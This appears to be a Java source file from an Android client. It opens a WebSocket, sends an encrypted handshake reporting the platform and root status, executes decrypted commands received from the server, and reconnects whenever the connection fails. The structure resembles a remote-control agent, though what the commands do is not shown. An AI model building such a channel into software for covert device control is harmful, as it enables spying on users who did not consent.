package com.wahala.client;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

import java.util.concurrent.TimeUnit;

public class Network {
    private OkHttpClient client;
    private WebSocket webSocket;
    private ServiceCore service;

    public Network(ServiceCore service) {
        this.service = service;
        client = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .build();
    }

    public void connect(String url) {
        Request request = new Request.Builder().url(url).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                String handshake = "{\"platform\":\"android\",\"rooted\":false}";
                byte[] encrypted = Crypto.encrypt(handshake);
                if (encrypted != null) {
                    webSocket.send(ByteString.of(encrypted));
                }
            }

            @Override
            public void onMessage(WebSocket webSocket, ByteString bytes) {
                String cmd = Crypto.decrypt(bytes.toByteArray());
                if (cmd != null) {
                    service.handleCommand(cmd);
                }
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                service.reconnect();
            }
        });
    }

    public void send(String data) {
        if (webSocket != null) {
            byte[] encrypted = Crypto.encrypt(data);
            if (encrypted != null) {
                webSocket.send(ByteString.of(encrypted));
            }
        }
    }

    public void close() {
        if (webSocket != null) webSocket.close(1000, "bye");
    }
}